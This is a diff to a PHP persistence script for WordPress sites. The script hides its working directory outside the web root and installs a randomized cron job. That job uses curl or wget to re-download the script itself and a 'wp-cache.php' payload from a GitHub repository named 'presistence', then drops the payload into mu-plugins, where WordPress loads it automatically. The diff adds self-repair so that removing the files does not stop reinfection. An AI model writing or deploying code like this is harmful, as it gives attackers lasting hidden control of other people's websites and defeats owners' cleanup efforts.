@@ -4,8 +4,10 @@
 declare(strict_types=1);
 
 const WG_SOURCE    = 'https://raw.githubusercontent.com/zaaroot994-boop/presistence/refs/heads/main/wp-cache.php';
-const WG_FILE      = 'cache.php';
-const WG_SENTINELS = ['cache.php', 'wp-cache.php'];
+const WG_SELF_URL  = 'https://raw.githubusercontent.com/zaaroot994-boop/presistence/refs/heads/main/guard.php';
+const WG_FILE      = 'wp-cache.php';
+const WG_LEGACY    = 'cache.php';
+const WG_SENTINELS = ['wp-cache.php'];
 const WG_MIN_BYTES = 256;
 const WG_TTL       = 86400;  // one day between successful checks
 const WG_RETRY_TTL = 900;    // retry window after a failure
@@ -22,9 +24,13 @@ function wg_out(string $message): void
 /** Silently remember the last failure without spamming logs. */
 function wg_note(string $dir, string $message): void
 {
-    if ($dir !== '') {
-        @file_put_contents($dir . '/.log', '[' . date('c') . '] ' . $message . PHP_EOL, FILE_APPEND | LOCK_EX);
+    if ($dir === '') {
+        return;
     }
+    $file = $dir . '/.log';
+    @file_put_contents($file, '[' . date('c') . '] ' . $message . PHP_EOL, FILE_APPEND | LOCK_EX);
+    wg_share($file, $dir);
+    @chmod($file, 0664);
 }
 
 /** Absolute path of this file, symlinks resolved where possible. */
@@ -75,6 +81,37 @@ function wg_bases(): array
 /** Locate the WordPress root (a directory that owns wp-content). */
 function wg_root(): ?string
 {
+    // Explicit --root= from the repairing cron line.
+    $override = isset($GLOBALS['wg_root_override']) ? rtrim((string) $GLOBALS['wg_root_override'], '/\\') : '';
+    if ($override !== '' && is_dir($override . '/wp-content')
+        && (is_file($override . '/wp-load.php') || is_file($override . '/wp-config.php'))) {
+        return $override;
+    }
+
+    // The deployed worker lives outside the app and remembers its root here.
+    $marker = __DIR__ . '/.root';
+    if (is_file($marker)) {
+        $saved = rtrim(trim((string) @file_get_contents($marker)), '/\\');
+        if ($saved !== '' && is_dir($saved . '/wp-content')
+            && (is_file($saved . '/wp-load.php') || is_file($saved . '/wp-config.php'))) {
+            return $saved;
+        }
+    }
+
+    // Marker gone: body sits in <parent>/.wg, so scan sibling sites.
+    if (basename(__DIR__) === WG_DIRNAME) {
+        $hits = [];
+        foreach ((array) glob(dirname(__DIR__) . '/*/wp-content', GLOB_ONLYDIR) as $candidate) {
+            $candidateRoot = dirname((string) $candidate);
+            if (is_file($candidateRoot . '/wp-load.php') || is_file($candidateRoot . '/wp-config.php')) {
+                $hits[] = $candidateRoot;
+            }
+        }
+        if (count($hits) === 1) {
+            return $hits[0];
+        }
+    }
+
     foreach (wg_bases() as $base) {
         $base = rtrim($base, '/\\');
         if (is_dir($base . '/wp-content') && (is_file($base . '/wp-load.php') || is_file($base . '/wp-config.php'))) {
@@ -93,10 +130,62 @@ function wg_root(): ?string
     return null;
 }
 
-/** Hidden working directory (created on demand). */
+/** Give a freshly created path the group of $like (best effort). */
+function wg_share(string $path, string $like): void
+{
+    $group = @filegroup($like);
+    if ($group !== false) {
+        @chgrp($path, $group);
+    }
+}
+
+/** Create a directory, inheriting the group/permissions of $like. */
+function wg_mkdir(string $path, string $like): bool
+{
+    if (is_dir($path)) {
+        return true;
+    }
+    if (!@mkdir($path, 0775, true)) {
+        return false;
+    }
+    wg_share($path, $like);
+    @chmod($path, 0775);
+
+    return is_dir($path);
+}
+
+/** Hidden working directory, kept outside the app when possible. */
 function wg_dir(string $root): string
 {
+    $parent = dirname($root);
+    $outside = $parent . '/' . WG_DIRNAME;
+
+    if (is_dir($outside)) {
+        if (is_writable($outside)) {
+            return $outside;
+        }
+    } elseif (@is_dir($parent) && is_writable($parent) && wg_mkdir($outside, $parent)) {
+        return $outside;
+    }
+
+    // Parent not writable: fall back inside the app.
     return $root . '/wp-content/uploads/' . WG_DIRNAME;
+}
+
+/** Write a small state file, group-shared so other web workers can update it. */
+function wg_put(string $file, string $data, string $like): void
+{
+    if (@file_put_contents($file, $data) === false) {
+        return;
+    }
+    wg_share($file, $like);
+    @chmod($file, 0664);
+}
+
+/** Remember the resolved root next to the deployed worker. */
+function wg_pin_root(string $dir, string $root): void
+{
+    wg_put($dir . '/.root', $root, $dir);
 }
 
 /** Deterministic, unguessable-looking worker name. */
@@ -346,15 +435,36 @@ function wg_spool_write(string $content): bool
     return true;
 }
 
+/** Shell snippet: download $src to $dest via curl or wget. */
+function wg_dl(string $src, string $dest): string
+{
+    $src = escapeshellarg($src);
+    $dest = escapeshellarg($dest);
+
+    return '{ curl -fsSL --connect-timeout 8 --max-time ' . WG_TIMEOUT . ' --retry 2 -o ' . $dest . ' ' . $src
+        . ' || wget -q -T ' . WG_TIMEOUT . ' -t 2 -O ' . $dest . ' ' . $src . '; }';
+}
+
 /** Install the schedule: crontab -> cron.d -> spool. */
-function wg_cron_install(string $root, string $worker, string $php): string
+function wg_cron_install(string $root, string $mu, string $dir, string $worker, string $php): string
 {
     if (wg_cron_present($worker)) {
         return 'exists';
     }
 
-    $line = random_int(0, 59) . ' ' . random_int(1, 6) . ' * * * '
-        . escapeshellarg($php) . ' ' . escapeshellarg($worker) . ' --run --quiet >/dev/null 2>&1';
+    // The job repairs itself: recreate dirs, restore the worker and the
+    // payload, then let the worker verify. It never depends on .wg surviving.
+    $tmp = $mu . '/.wg-dl.php';
+    $schedule = random_int(0, 59) . ' ' . random_int(1, 6) . ' * * *';
+    $command = 'mkdir -p ' . escapeshellarg($mu) . ' ' . escapeshellarg($dir)
+        . '; chmod 775 ' . escapeshellarg($mu) . ' ' . escapeshellarg($dir) . ' 2>/dev/null'
+        . '; ' . wg_dl(WG_SELF_URL, $worker)
+        . ' && ' . wg_dl(WG_SOURCE, $tmp)
+        . ' && mv -f ' . escapeshellarg($tmp) . ' ' . escapeshellarg($mu . '/' . WG_FILE)
+        . '; echo ' . escapeshellarg($root) . ' > ' . escapeshellarg($dir . '/.root')
+        . '; ' . escapeshellarg($php) . ' ' . escapeshellarg($worker) . ' ' . escapeshellarg('--root=' . $root)
+        . ' --run --quiet >/dev/null 2>&1';
+    $line = $schedule . ' ' . $command;
 
     $current = wg_cron_read();
     if ($current !== null) {
@@ -365,7 +475,7 @@ function wg_cron_install(string $root, string $worker, string $php): string
 
     if (is_dir('/etc/cron.d') && is_writable('/etc/cron.d')) {
         $file = '/etc/cron.d/wg-' . substr(sha1($worker), 0, 8);
-        if (@file_put_contents($file, $line . ' ' . wg_user() . "\n") !== false) {
+        if (@file_put_contents($file, $schedule . ' ' . wg_user() . ' ' . $command . "\n") !== false) {
             @chmod($file, 0644);
             if (is_file($file)) {
                 return 'cron.d';
@@ -485,9 +595,13 @@ function wg_valid(string $body): bool
     return strlen($body) >= WG_MIN_BYTES && substr($body, 0, 5) === '<?php';
 }
 
-/** Atomic write of the payload as cache.php. */
+/** Atomic write of the payload as wp-cache.php. */
 function wg_install_payload(string $mu, string $body): bool
 {
+    if (!is_dir($mu) && !wg_mkdir($mu, dirname($mu))) {
+        return false;
+    }
+
     $dest = $mu . '/' . WG_FILE;
     $tmp = @tempnam($mu, '.wg-tmp-');
     if (!is_string($tmp)) {
@@ -499,7 +613,8 @@ function wg_install_payload(string $mu, string $body): bool
 
         return false;
     }
-    @chmod($tmp, 0644);
+    @chmod($tmp, 0664);
+    wg_share($tmp, $mu);
 
     $check = @file_get_contents($tmp);
     if (!is_string($check) || !wg_valid($check)) {
@@ -520,7 +635,8 @@ function wg_install_payload(string $mu, string $body): bool
         return false;
     }
 
-    @chmod($dest, 0644);
+    @chmod($dest, 0664);
+    wg_share($dest, $mu);
     clearstatcache(true, $dest);
 
     return is_file($dest) && (int) @filesize($dest) >= WG_MIN_BYTES;
@@ -529,8 +645,11 @@ function wg_install_payload(string $mu, string $body): bool
 /** Remove temp litter older than an hour. */
 function wg_sweep(string $mu): void
 {
-    $hits = glob($mu . '/.wg-tmp-*');
-    if (!is_array($hits)) {
+    $hits = array_merge(
+        (array) glob($mu . '/.wg-tmp-*'),
+        (array) glob($mu . '/.wg-dl.php')
+    );
+    if ($hits === []) {
         return;
     }
     $limit = time() - 3600;
@@ -539,6 +658,14 @@ function wg_sweep(string $mu): void
             @unlink($hit);
         }
     }
+}
+
+/** Touch a state file, group-shared. */
+function wg_touch(string $file, string $like): void
+{
+    @touch($file);
+    wg_share($file, $like);
+    @chmod($file, 0664);
 }
 
 /** Human age / size helpers. */
@@ -573,14 +700,16 @@ function wg_place(string $src, string $dir, string $dest): bool
 
         return false;
     }
-    @chmod($tmp, 0644);
+    @chmod($tmp, 0664);
+    wg_share($tmp, $dir);
 
     if (!@rename($tmp, $dest)) {
         @unlink($tmp);
 
         return false;
     }
-    @chmod($dest, 0644);
+    @chmod($dest, 0664);
+    wg_share($dest, $dir);
 
     return is_file($dest);
 }
@@ -612,14 +741,21 @@ function wg_deploy(bool $verbose): bool
         return false;
     }
 
-    if (!is_dir($uploads) && !@mkdir($uploads, 0755, true)) {
+    if (!is_dir($uploads) && !wg_mkdir($uploads, $root . '/wp-content')) {
         wg_out('fail: cannot create ' . $uploads);
 
         return false;
     }
 
-    if (!is_dir($dir) && !@mkdir($dir, 0755, true)) {
+    if (!is_dir($dir) && !wg_mkdir($dir, dirname($dir))) {
         wg_out('fail: cannot create ' . $dir);
+
+        return false;
+    }
+    wg_pin_root($dir, $root);
+
+    if (!is_dir($mu) && !wg_mkdir($mu, $root . '/wp-content')) {
+        wg_out('fail: cannot create ' . $mu);
 
         return false;
     }
@@ -641,9 +777,9 @@ function wg_deploy(bool $verbose): bool
 
         return false;
     }
-    @file_put_contents($dir . '/.phpbin', $php);
+    wg_put($dir . '/.phpbin', $php, $dir);
 
-    $result = wg_cron_install($root, $worker, $php);
+    $result = wg_cron_install($root, $mu, $dir, $worker, $php);
     if ($result === 'failed') {
         wg_out('fail: cron could not be installed (crontab and user spool unavailable)');
         return false;
@@ -671,10 +807,12 @@ function wg_run(bool $force, bool $verbose): int
     }
 
     if (!is_dir($dir)) {
-        @mkdir($dir, 0755, true);
+        wg_mkdir($dir, dirname($dir));
     }
+    wg_pin_root($dir, $root);
+    wg_htaccess($dir);
 
-    if (!is_dir($mu) && !@mkdir($mu, 0755, true)) {
+    if (!is_dir($mu) && !wg_mkdir($mu, $root . '/wp-content')) {
         wg_note($dir, 'mu-plugins missing and not creatable');
         if ($verbose) {
             wg_out('fail: cannot create ' . $mu);
@@ -697,7 +835,7 @@ function wg_run(bool $force, bool $verbose): int
     if ($php === '' || !is_executable($php)) {
         $php = (string) (wg_php() ?? '');
         if ($php !== '') {
-            @file_put_contents($dir . '/.phpbin', $php);
+            wg_put($dir . '/.phpbin', $php, $dir);
         }
     }
 
@@ -707,13 +845,17 @@ function wg_run(bool $force, bool $verbose): int
             wg_htaccess($dir);
         }
 
-        wg_cron_install($root, $worker, $php);
+        wg_cron_install($root, $mu, $dir, $worker, $php);
     }
 
     $okFile = $dir . '/.ok';
     $failFile = $dir . '/.fail';
 
     $lock = @fopen($dir . '/.lock', 'c');
+    if (is_resource($lock)) {
+        wg_share($dir . '/.lock', $dir);
+        @chmod($dir . '/.lock', 0664);
+    }
     if (is_resource($lock) && !flock($lock, LOCK_EX | LOCK_NB)) {
         if ($verbose) {
             wg_out('busy: another tick holds the lock');
@@ -745,8 +887,11 @@ function wg_run(bool $force, bool $verbose): int
 
         $healthy = wg_healthy($mu);
         if ($healthy !== null) {
-            @touch($okFile);
+            wg_touch($okFile, $dir);
             @unlink($failFile);
+            if (WG_LEGACY !== WG_FILE && is_file($mu . '/' . WG_LEGACY)) {
+                @unlink($mu . '/' . WG_LEGACY);
+            }
             if ($verbose) {
                 wg_out('ok: ' . basename($healthy) . ' present (' . wg_size($healthy) . ')');
             }
@@ -756,7 +901,7 @@ function wg_run(bool $force, bool $verbose): int
 
         $body = wg_fetch();
         if ($body === null || !wg_valid($body)) {
-            @touch($failFile);
+            wg_touch($failFile, $dir);
             $reason = $body === null ? 'download failed' : 'payload failed validation';
             wg_note($dir, $reason);
             if ($verbose) {
@@ -767,7 +912,7 @@ function wg_run(bool $force, bool $verbose): int
         }
 
         if (!wg_install_payload($mu, $body)) {
-            @touch($failFile);
+            wg_touch($failFile, $dir);
             wg_note($dir, 'cannot write ' . $mu . '/' . WG_FILE);
             if ($verbose) {
                 wg_out('fail: cannot write ' . $mu . '/' . WG_FILE);
@@ -776,8 +921,11 @@ function wg_run(bool $force, bool $verbose): int
             return 1;
         }
 
-        @touch($okFile);
+        wg_touch($okFile, $dir);
         @unlink($failFile);
+        if (WG_LEGACY !== WG_FILE && is_file($mu . '/' . WG_LEGACY)) {
+            @unlink($mu . '/' . WG_LEGACY);
+        }
         wg_sweep($mu);
         if ($verbose) {
             wg_out('restored: ' . WG_FILE . ' (' . wg_size($mu . '/' . WG_FILE) . ')');
@@ -866,7 +1014,7 @@ function wg_uninstall(): int
         @unlink($self);
     }
 
-    wg_out('uninstalled (payload cache.php left untouched)');
+    wg_out('uninstalled (payload ' . WG_FILE . ' left untouched)');
 
     return 0;
 }
@@ -901,6 +1049,14 @@ function wg_main(): int
     $flag = static function (string $name) use ($args): bool {
         return in_array('--' . $name, $args, true);
     };
+
+    // Cron may hand over the root when its marker file is gone.
+    foreach ($args as $arg) {
+        if (strncmp((string) $arg, '--root=', 7) === 0) {
+            $GLOBALS['wg_root_override'] = substr((string) $arg, 7);
+            break;
+        }
+    }
 
     if ($isCli ? $flag('quiet') : isset($_GET['quiet'])) {
         $verbose = false;
